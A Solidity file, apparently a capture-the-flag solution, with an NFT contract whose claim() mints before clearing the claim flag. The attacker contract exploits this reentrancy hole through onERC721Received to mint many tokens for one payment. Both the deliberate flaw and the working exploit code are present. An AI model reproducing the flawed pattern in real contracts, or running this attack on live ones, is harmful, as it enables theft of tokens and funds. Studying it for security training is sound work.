// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;

import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract safeNFT is ERC721Enumerable {
    uint256 price;
    mapping(address=>bool) public canClaim;

    constructor(string memory tokenName, string memory tokenSymbol,uint256 _price) ERC721(tokenName, tokenSymbol) {
        price = _price; //price = 0.01 ETH
    }

    function buyNFT() external payable {
        require(price==msg.value,"INVALID_VALUE");
        canClaim[msg.sender] = true;
    }

    function claim() external {
        require(canClaim[msg.sender],"CANT_MINT");
        _safeMint(msg.sender, totalSupply()); 
        canClaim[msg.sender] = false;
    }
}

contract AttackerContract_SafeNFT  {
    address target;
    uint num_of_NFT_s;
    uint num;
    function attack (address _target,uint _num_of_NFT_s) public payable {
    target = _target;
    num_of_NFT_s = _num_of_NFT_s;
    safeNFT(target).buyNFT{value:msg.value}();
    safeNFT(target).claim();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (num < num_of_NFT_s ) {
            num ++;
            safeNFT(target).claim();
        } 
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
        }

}
